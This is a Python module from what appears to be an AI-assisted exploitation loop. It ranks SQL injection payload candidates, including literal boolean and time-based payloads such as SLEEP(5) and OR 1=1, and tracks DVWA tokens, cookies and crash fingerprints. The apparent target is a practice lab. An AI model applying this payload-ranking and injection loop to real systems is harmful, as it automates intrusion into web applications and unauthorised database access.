from __future__ import annotations

import re
from dataclasses import asdict, is_dataclass
from typing import Any, Dict, Iterable, Tuple

from core.models import Observation, PatchPlan


def _safe_dump(obj: Any) -> Any:
    """
    Recursively convert dataclasses / pydantic / objects into JSON-safe types.
    """
    if obj is None:
        return None

    if isinstance(obj, (str, int, float, bool)):
        return obj

    if isinstance(obj, dict):
        return {str(k): _safe_dump(v) for k, v in obj.items()}

    if isinstance(obj, (list, tuple)):
        return [_safe_dump(x) for x in obj]

    if hasattr(obj, "model_dump"):
        return _safe_dump(obj.model_dump())

    if is_dataclass(obj):
        return _safe_dump(asdict(obj))

    if hasattr(obj, "__dict__"):
        return _safe_dump(vars(obj))

    return str(obj)


def _normalize_payload(payload: Any) -> str:
    return " ".join(str(payload or "").strip().split())


def _detect_payload_family(payload: Any) -> str:
    norm = _normalize_payload(payload).lower()
    if not norm:
        return "unknown"
    if "sleep(" in norm or "benchmark(" in norm or "if(" in norm:
        return "time"
    if "union" in norm and "select" in norm:
        return "union"
    if any(op in norm for op in (" and ", " or ")) and any(sym in norm for sym in ("=", "!=", "<>", "<", ">")):
        return "boolean"
    return "unknown"


def _detect_boolean_operator(payload: Any) -> str:
    norm = f" {_normalize_payload(payload).lower()} "
    if " and " in norm:
        return "and"
    if " or " in norm:
        return "or"
    return "unknown"


def _looks_like_valid_repair(payload: Any) -> bool:
    """
    Lightweight sanity check so selection prefers actually repaired payloads
    over malformed candidates that merely resemble the original input.
    """
    p = _normalize_payload(payload)
    if not p:
        return False

    lower = p.lower()
    false_probe_patterns = [
        r"\b1\s*=\s*2\b",
        r"\b2\s*=\s*1\b",
        r"'1'\s*=\s*'2'",
        r"'a'\s*=\s*'b'",
        r"\band\s+false\b",
        r"\bor\s+false\b",
    ]
    if any(re.search(pattern, lower) for pattern in false_probe_patterns):
        return False

    if re.search(r"\b(and|or)\s*$", lower):
        return False

    if re.search(r"\b(and|or)\s*=\s*", lower):
        return False

    if re.search(r"\b(and|or)\s+[a-z_][a-z0-9_]*\s*$", lower):
        if "true" not in lower and "false" not in lower and "sleep" not in lower:
            return False

    if "sleep " in lower and "sleep(" not in lower:
        return False

    if "if(" in lower:
        if "sleep(" in lower and ",0" not in lower:
            return False
        if "if(1=1 sleep" in lower:
            return False

    if p.count("'") % 2 != 0 and "--" not in p and "#" not in p:
        return False

    depth = 0
    for ch in p:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
            if depth < 0:
                return False
    if depth != 0:
        return False

    return True


def select_best_candidate(
    candidates: Iterable[Any],
    history: Iterable[Dict[str, Any]],
    context: Dict[str, Any],
) -> Tuple[str, str]:
    """
    Select the best candidate with simple, explainable rules.
    Returns (payload, reason).

    Priority:
    1. Avoid duplicates / previously used payloads
    2. Strongly prefer syntactically repaired payloads
    3. Preserve payload family (boolean/time/union)
    4. Preserve boolean operator intent (AND vs OR) when applicable
    5. Preserve style (quoted vs numeric)
    6. Preserve useful structure from the original payload
    """
    current_payload = _normalize_payload(context.get("current_payload"))
    current_family = _detect_payload_family(current_payload)
    current_operator = _detect_boolean_operator(current_payload)
    preferred_style = str(context.get("preferred_style") or "").strip()

    seen_history = {
        _normalize_payload(a.get("normalized_payload") or a.get("payload"))
        for a in (history or [])
        if isinstance(a, dict) and (a.get("normalized_payload") or a.get("payload"))
    }

    ranked = []
    seen_candidates = set()

    current_tokens = set(current_payload.lower().split()) if current_payload else set()
    current_is_quoted = "'" in current_payload

    for raw in candidates or []:
        payload = _normalize_payload(raw)
        if not payload:
            continue
        if payload in seen_candidates:
            continue
        seen_candidates.add(payload)

        score = 0.0
        reasons = []

        family = _detect_payload_family(payload)
        candidate_operator = _detect_boolean_operator(payload)
        candidate_tokens = set(payload.lower().split())
        is_quoted = "'" in payload
        is_valid_repair = _looks_like_valid_repair(payload)

        if payload in seen_history:
            score -= 5.0
            reasons.append("already used in attempt history")
        else:
            score += 3.0
            reasons.append("not previously used")

        if not is_valid_repair:
            score -= 6.0
            reasons.append("looks like malformed repair")
        else:
            score += 2.5
            reasons.append("looks like syntactically valid repair")

        if current_family != "unknown" and family == current_family:
            score += 2.5
            reasons.append(f"preserves {current_family} family")
        elif current_family != "unknown" and family != current_family:
            score -= 1.5
            reasons.append(f"changes family from {current_family} to {family}")

        if current_operator != "unknown" and candidate_operator == current_operator:
            score += 2.0
            reasons.append(f"preserves {current_operator.upper()} operator")
        elif current_operator != "unknown" and candidate_operator != current_operator:
            score -= 1.25
            reasons.append(
                f"switches operator from {current_operator.upper()} to {candidate_operator.upper()}"
            )

        if preferred_style == "quoted" or (not preferred_style and current_is_quoted):
            if is_quoted:
                score += 1.25
                reasons.append("matches quoted context")
            else:
                score -= 0.5
                reasons.append("switches away from quoted context")
        elif preferred_style == "numeric" or (not preferred_style and current_payload and not current_is_quoted):
            if not is_quoted:
                score += 1.25
                reasons.append("matches numeric context")
            else:
                score -= 0.5
                reasons.append("switches away from numeric context")

        if current_operator != "unknown" and current_operator in candidate_tokens:
            score += 1.0
            reasons.append("continues original boolean structure")

        if current_tokens:
            overlap = len(current_tokens & candidate_tokens)
            if overlap >= 1:
                score += min(1.2, overlap * 0.35)
                reasons.append("keeps parts of original payload")

        generic_set = {
            "1' AND 1=1 -- -",
            "1 OR 1=1",
            "1 AND 1=1",
            "1' AND SLEEP(5) -- -",
        }
        if payload in generic_set:
            score -= 0.35
            reasons.append("generic fallback candidate")
        else:
            score += 0.4
            reasons.append("more specific than generic fallback")

        ranked.append((score, payload, "; ".join(reasons)))

    if not ranked:
        fallback = current_payload or ""
        return fallback, "fallback to current payload because no valid candidates were available"

    ranked.sort(key=lambda item: item[0], reverse=True)
    best_score, best_payload, best_reason = ranked[0]

    if best_score < 0:
        return best_payload, "fallback to first valid candidate after filtering history and duplicates"

    return best_payload, best_reason or "selected highest ranked candidate"


def _maybe_select_candidate(plan: PatchPlan, state: Dict[str, Any]) -> None:
    metadata = getattr(plan, "metadata", None) or {}
    candidates = metadata.get("candidates") or []
    if not isinstance(candidates, list) or not candidates:
        return

    history = state.get("attempt_history") or []
    current_payload = (
        metadata.get("current_payload")
        or state.get("verified_exploit_payload")
        or ""
    )
    preferred_style = "quoted" if "'" in str(current_payload or "") else "numeric"

    selected_payload, selection_reason = select_best_candidate(
        candidates=candidates,
        history=history,
        context={
            "current_payload": current_payload,
            "preferred_style": preferred_style,
        },
    )

    target_step = metadata.get("target_step_id")
    target_param = metadata.get("target_param")

    for action in plan.actions:
        if action.type != "mutate_step_query_param":
            continue
        value = action.value or {}
        if target_step and value.get("step_id") != target_step:
            continue
        if target_param and value.get("param") != target_param:
            continue
        value["new_value"] = selected_payload
        action.value = value
        break

    metadata["selected_payload"] = selected_payload
    metadata["selection_reason"] = selection_reason
    plan.metadata = metadata

    candidate_pool = list(
        dict.fromkeys(
            _normalize_payload(x) for x in candidates if _normalize_payload(x)
        )
    )

    previous_selected = state.get("selected_payload")

    state["candidate_pool"] = candidate_pool
    state["selected_payload"] = selected_payload
    state["selected_payload_reason"] = selection_reason
    state["verified_exploit_payload"] = selected_payload

    if previous_selected != selected_payload:
        print("[ADEXA] Candidates:")
        for candidate in candidate_pool:
            print(f"- {candidate}")
        print(f"[ADEXA] Selected Payload: {selected_payload}")
        print(f"[ADEXA] Selection Reason: {selection_reason}")


def _state_snapshot(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Save only the most useful state values for debugging, memory, and analysis.
    """
    return _safe_dump({
        "run_id": state.get("run_id"),
        "step_index": state.get("step_index"),
        "last_failure_type": state.get("last_failure_type"),
        "last_step_id": state.get("last_step_id"),
        "strategy_used": state.get("strategy_used"),
        "verified_exploit_payload": state.get("verified_exploit_payload"),
        "ai_reason": state.get("ai_reason"),
        "used_memory_case": state.get("used_memory_case"),
        "memory_match_reason": state.get("memory_match_reason"),
        "candidate_pool": state.get("candidate_pool"),
        "selected_payload": state.get("selected_payload"),
        "selected_payload_reason": state.get("selected_payload_reason"),
        "time_probe_active": state.get("time_probe_active"),
        "time_probe_attempts": state.get("time_probe_attempts"),
        "time_probe_confirmations": state.get("time_probe_confirmations"),
        "time_probe_sleep": state.get("time_probe_sleep"),
        "time_probe_step_id": state.get("time_probe_step_id"),
        "time_probe_baseline_step": state.get("time_probe_baseline_step"),
        "dvwa_security_level": state.get("dvwa_security_level"),
        "dvwa_user_token": state.get("dvwa_user_token"),
        "cookie_jar": state.get("cookie_jar"),
    })


def run_loop(backend, state: Dict[str, Any], store, max_iters: int = 6) -> Dict[str, Any]:
    """
    Loop behavior:
    - Always save observation + plan
    - If success: let backend finalize first, then log STOP with verified=True
    - For candidate-aware plans: select the best payload before backend.apply()
    """
    last_crash_fp = None

    for i in range(max_iters):
        obs: Observation = backend.observe(state)

        if backend.is_success(state, obs):
            if hasattr(backend, "finalize_success"):
                state = backend.finalize_success(state, obs)

            store.save_iteration(i, {
                "iter": i,
                "event": "stop",
                "reason": "success",
                "verified": True,
                "backend": getattr(backend, "name", "unknown"),
                "observation": _safe_dump(obs),
                "state": _state_snapshot(state),
                "state_keys": sorted(list(state.keys())),
            })
            return state

        plan: PatchPlan | None = backend.ai_plan(obs, state)

        if plan is not None:
            _maybe_select_candidate(plan, state)

        store.save_iteration(i, {
            "iter": i,
            "backend": getattr(backend, "name", "unknown"),
            "observation": _safe_dump(obs),
            "plan": _safe_dump(plan) if plan else None,
            "state": _state_snapshot(state),
            "state_keys": sorted(list(state.keys())),
        })

        if plan is None:
            store.save_iteration(i + 1, {
                "iter": i + 1,
                "event": "stop",
                "reason": "no_plan",
                "verified": False,
                "backend": getattr(backend, "name", "unknown"),
                "observation": _safe_dump(obs),
                "state": _state_snapshot(state),
                "state_keys": sorted(list(state.keys())),
            })
            return state

        state = backend.apply(plan, state)

        crash_fp = None
        if obs and getattr(obs, "crash", None):
            sig = getattr(obs.crash, "signal", None)
            addr = getattr(obs.crash, "crash_address", None)
            ip = None
            if getattr(obs.crash, "registers", None):
                regs = {k.lower(): str(v).lower() for k, v in obs.crash.registers.items()}
                ip = regs.get("pc") or regs.get("rip") or regs.get("eip") or regs.get("x30")
            crash_fp = f"{sig}|{addr}|{ip}"

        if crash_fp is not None and crash_fp == last_crash_fp:
            store.save_iteration(i + 1, {
                "iter": i + 1,
                "event": "stop",
                "reason": "repeat_crash",
                "verified": False,
                "backend": getattr(backend, "name", "unknown"),
                "crash_fp": crash_fp,
                "observation": _safe_dump(obs),
                "plan": _safe_dump(plan),
                "state": _state_snapshot(state),
                "state_keys": sorted(list(state.keys())),
            })
            return state

        last_crash_fp = crash_fp

    store.save_iteration(max_iters, {
        "iter": max_iters,
        "event": "stop",
        "reason": "max_iters",
        "verified": False,
        "backend": getattr(backend, "name", "unknown"),
        "state": _state_snapshot(state),
        "state_keys": sorted(list(state.keys())),
    })
    return state
